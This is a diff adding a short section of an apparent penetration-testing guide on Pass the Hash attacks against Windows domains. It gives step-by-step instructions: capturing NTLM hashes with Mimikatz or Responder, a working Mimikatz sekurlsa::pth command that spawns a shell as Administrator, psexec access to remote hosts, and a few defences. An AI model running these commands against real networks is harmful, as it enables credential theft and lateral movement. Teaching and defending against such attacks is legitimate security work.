@@ -1,0 +1,19 @@
+E.1 What It Is
+	• Pass the Hash (PtH): Using an NTLM hash directly to authenticate to remote systems without cracking the password.
+E.2 Why It Matters
+	• Attackers with a single privileged NTLM hash can pivot to countless Windows hosts or services.
+	• Common in “lateral movement” scenarios.
+E.3 How to Exploit (Step-by-Step)
+	1. Capture NTLM Hash
+		○ Via Mimikatz, Responder, NTDS.dit, etc.
+	2. Use Mimikatz
+
+powershell
+CopyEdit
+sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe
+	3. Authenticate to Remote Host
+		○ psexec \\remotehost cmd or dir \\remotehost\C$—the OS sees valid credentials because you’re using the hash.
+	4. Defend
+		○ Turn on SMB signing or Windows Defender Credential Guard.
+		○ Enforce Privilege Access Workstations for domain admins.
+		○ Limit local admin privileges to reduce PtH impact.
